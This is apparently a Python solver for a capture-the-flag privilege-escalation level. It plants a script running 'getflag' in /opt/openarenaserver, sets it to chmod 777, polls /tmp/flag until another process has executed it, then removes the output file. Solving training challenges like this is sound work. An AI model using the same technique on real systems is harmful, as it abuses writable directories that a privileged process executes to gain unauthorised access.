from solver.utils import extract_flag
from time import sleep

def solve(connection):
	print("*** This level takes some time to solve: dont't lose faith ***", flush=True)
	connection.exec("echo 'getflag > /tmp/flag' > /opt/openarenaserver/flag.sh")
	connection.exec("chmod 777 /opt/openarenaserver/flag.sh")
	while True:
		flag = connection.exec("cat /tmp/flag")
		if "Error" in flag:
			sleep(1)
			print("Waiting for flag...", flush=True)
			continue
		else:
			extracted_flag = extract_flag(flag) 
			connection.exec("rm /tmp/flag")
			return "", extracted_flag